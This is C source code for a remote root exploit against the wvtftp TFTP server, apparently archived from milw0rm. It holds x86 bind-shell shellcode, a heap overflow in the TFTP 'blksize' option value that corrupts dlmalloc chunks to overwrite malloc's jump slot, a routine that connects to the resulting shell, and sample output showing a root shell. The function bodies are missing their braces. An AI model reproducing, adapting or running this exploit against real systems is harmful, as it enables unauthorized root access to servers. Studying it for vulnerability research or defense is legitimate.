/*
* wvtftp option name heap overflow remote root exploit
*
* infamous42md AT hotpop DOT com
*
* exploitation is not exactly straight forward. When we overflow our buffer,
* we overwrite a pointer that is freed before we get to trigger our overwrite.
* so we have to restore the state of this pointer to some sane value so it can
* be freed. after we do this, we trigger the overwrite, and hijack the
* jumpslot for malloc(). then to trigger malloc(), we send a bogus request,
* and then connect to our shell. all of the offsets should be fixed for 32 bit
* platforms, all you need to pass is the base address of the heap buffer we're
* overflowing. 'ltrace wvtftpd -dd 2>&1 | grep malloc | grep 616', and of
* course the jumpslot for malloc(), 'objdump -R wvtftpd | grep malloc'.
*
*/

#if 0
Usage: ./a.out
[ -h host ] [ -r object_heap_base ] [ -l retloc ]
[ -f remote file ] < -p port > < -a align >
[n00b@localho.outernet] ./a.out -h localho -r 0x8063cd0 -l 0x0805e540

connected to localho(127.0.0.1)

exploit sent, total data len 597

triggering overwritten jumpslot


connected to localho(127.0.0.1)

got a shell

id
uid=0(root) gid=0(root)
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)

- Connection closed by user
#endif

#include <stdio.h>
#include <sys/types.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>

#define REMOTE_FILE "foo"
#define FTP_PORT 69
#define NOP 0x90
#define BS 0x1000
#define SHELL_PORT 7000
#define ALIGN 0
#define die(x) do{ perror(x); exit(1); }while(0)

/* a dlmalloc chunk descriptor */
#define CHUNKSZ sizeof(mchunk_t)
typedef struct _mchunk {
size_t prevsz;
size_t sz;
long fd;
long bk;
} mchunk_t;

/* program arguments */
typedef struct _args {
char *host,
*remote_file;
u_long object_heap_base,
retloc;
u_short port,
align;
} args;


/* call them shell code */
#define SHELL_LEN (sizeof(remote)-1)
char remote[] =
"\xeb\x0a""1234567890" /* jump */
"\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6"
"\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50"
"\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a"
"\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31"
"\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0"
"\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80"
"\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\xa1\x5f\x66\x6e\x69";


void usage(char *progname)

fprintf(stderr, "Usage: %s\n"
"\t[ -h host ] [ -r object_heap_base ] [ -l retloc ]\n"
"\t[ -f remote file ] < -p port > < -a align >\n",
progname);
exit(EXIT_FAILURE);



void parse_args(int argc, char **argv, args *argp)

int c = 0;

while((c = getopt(argc, argv, "h:p:r:a:l:")) != -1) {
switch (c) {
case 'a':
argp->align = atoi(optarg);
break;
case 'p':
argp->port = atoi(optarg);
break;
case 'r':
argp->object_heap_base = strtoul(optarg, NULL, 16);
break;
case 'l':
argp->retloc = strtoul(optarg, NULL, 16);
break;
case 'h':
argp->host = optarg;
break;
case 'f':
argp->remote_file = optarg;
break;
case ':':
case '?':
default:
usage(argv[0]);
}
}

if(optind != argc || argp->align > CHUNKSZ-1 || argp->object_heap_base == 0
|| 
argp->host == NULL || argp->port == 0 || argp->retloc == 0 || 
argp->remote_file == NULL)
usage(argv[0]);


int conn(char *host, u_short port, int proto)

int sock = 0;
struct hostent *hp;
struct sockaddr_in sa;

memset(&sa, 0, sizeof(sa));

hp = gethostbyname(host);
if (hp == NULL) {
herror("gethostbyname");
exit(EXIT_FAILURE);
}
sa.sin_family = AF_INET;
sa.sin_port = htons(port);
sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

sock = socket(AF_INET, proto, 0);
if (sock < 0)
die("socket");

/* with UDP this means we can write() instead of sendto() */
if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
die("connect");

printf("\nconnected to %s(%s)\n\n", host, inet_ntoa(sa.sin_addr));
return sock;


/*
* ftp packet bytes look like:
*
* 0-1 code - [0]*256 + [1] : 1 for read, 2 for write
* 2 NULL termed file name, must exist and be readable
* X NULL termed mode [ netascii octet mail ]
* Y NULL termed option name
* Z NULL termed option value : overflow with this string
* and a bad option to get our pointer freed
*/
void sploit(args *argp, int sock)

int len = 0, align = argp->align, x = 0, begin_packet_data;
long retloc = argp->retloc, object_heap_base = argp->object_heap_base;
char buf[BS], *remote_file = argp->remote_file;
mchunk_t chunk;

memset(buf, 0, BS);
memset(&chunk, 0, CHUNKSZ);

/* set opcode for reading */
buf[1] = 1;
len = 2;

/* the file to read, and the mode */
len += sprintf(buf + len, "%s", remote_file) + 1;
len += sprintf(buf + len, "%s", "octet") + 1;

/* all that follows gets copied via strcpy() */
begin_packet_data = len;

/* the option */
len += sprintf(buf+len, "%s", "blksize") + 1; /* 8 */

/* the overflow , but first a valid blocksize to past test */
len += sprintf(buf+len, "%s", "512"); /* 3 */

/* 
* from here buffer looks like:
* [ align - shell - chunks - pkttimes - chunks ]
*/
#define OFFSET_TO_OUR_BUF_FROM_BASE 56
/* setup the chunk */
chunk.prevsz = 0xfffffffc;
chunk.sz = 0xfffffffc;
chunk.fd = retloc - 12;
chunk.bk = object_heap_base + OFFSET_TO_OUR_BUF_FROM_BASE + align + 11/* 8 +
3 */;

memset(buf+len, 'A', align);
len += align;
memcpy(buf+len, remote, SHELL_LEN);
len += SHELL_LEN;

#define CHUNK_BYTES 416
for(x = 0; x < CHUNK_BYTES - (CHUNKSZ - 1); x+= CHUNKSZ)
memcpy(buf+len+x, &chunk, CHUNKSZ);
len += x;
buf[len++] = 0;

/* trigger the free with a bad option (no value) */
len += sprintf(buf+len, "%s", "blksize") + 1;

/*
* the buffer we overflow is part of a larger structure that is embedded in
* a class object located on the heap. the base address of this object is
* what 'object_heap_base' refers to. the structure is 'struct TFTPConn',
* member of the 'class WvTFTPBase'. we need to repair a pointer in the
* data that we overwrite. the pkttimes member of the structure is a
* pointer to an object of type 'class PktTime' that gets deleted. in this
* destructor for the object that gets deleted, a member pointer offset 12
* bytes in, is a pointer that gets freed via delete. This freed pointer
* needs to be set up by us. You could create a fake chunk and use that,
* but it is simpler to just make that pointer be NULL as free(0) does
* nothing. there are several spots where we have a guaranteed NULL word
* inside of the 'struct TFTPConn' class object. so the idea is to point
* pkttimes 12 bytes below that NULL, so that when it goes to free the
* pointer, it will use the NULL word.
*/

/* 
* our buffer is 512 bytes, and we start copying at 2 bytes in. the
* distance to pkttimes pointer is 526 bytes, rounded up to 4 byte boundary
*/
#define OFFSET_TO_PKTTIMES_IN_BUFFER 528
/*
* we point pkttimes at an area that contains guaranteed NULL word, which is
* the 'lastsent' member of the TFTPConn structure. it is the number of
* blocks which have been sent over teh connection so far. it will always
* be 0 since no blocks have been sent to us yet. if we know the base of
* the object we know where 'lastsent' is located.
*/
#define OFFSET_TO_NULL_POINTERS_FROM_BASE_MINUS_12 40
*(uint32_t *)(buf + begin_packet_data + OFFSET_TO_PKTTIMES_IN_BUFFER) = 
object_heap_base + OFFSET_TO_NULL_POINTERS_FROM_BASE_MINUS_12;

write(sock, buf, len);
printf("exploit sent, total data len %d\n\n", len);


void shell(char *host, u_short port)

int sock = 0, l = 0;
char buf[BS];
fd_set rfds;

sock = conn(host, port, SOCK_STREAM);

printf("got a shell\n\n");
FD_ZERO(&rfds);

while(1){
FD_SET(STDIN_FILENO, &rfds);
FD_SET(sock, &rfds);

if(select(sock + 1, &rfds, NULL, NULL, NULL) < 1)
die("select");

if(FD_ISSET(STDIN_FILENO, &rfds)) {
if((l = read(0, buf, BS)) <= 0)
die("\n - Connection closed by user\n");
if(write(sock, buf, l) < 1)
die("write");
}

if(FD_ISSET(sock, &rfds)) {
l = read(sock, buf, sizeof(buf));

if (l == 0)
die("\n - Connection terminated.\n");
else if(l < 0)
die("\n - Read failure\n");

if(write(1, buf, l) < 1)
die("write");
}
}


/*
* call the function whose jumpslot we overwrote, malloc()
*/
void trigger_retloc(int sock)

char buf[BS];

write(sock, buf, 200);


/*
*/
int main(int argc, char **argv)

int sock = 0;
args argy;

memset(&argy, 0, sizeof(argy));
argy.align = ALIGN;
argy.port = FTP_PORT;
argy.remote_file = REMOTE_FILE;

parse_args(argc, argv, &argy);

sock = conn(argy.host, argy.port, SOCK_DGRAM);

sploit(&argy, sock);

sleep(2);
printf("triggering overwritten jumpslot\n\n");
trigger_retloc(sock);
sleep(1);
close(sock);

shell(argy.host, SHELL_PORT);

return EXIT_SUCCESS;

// milw0rm.com [2004-10-28]
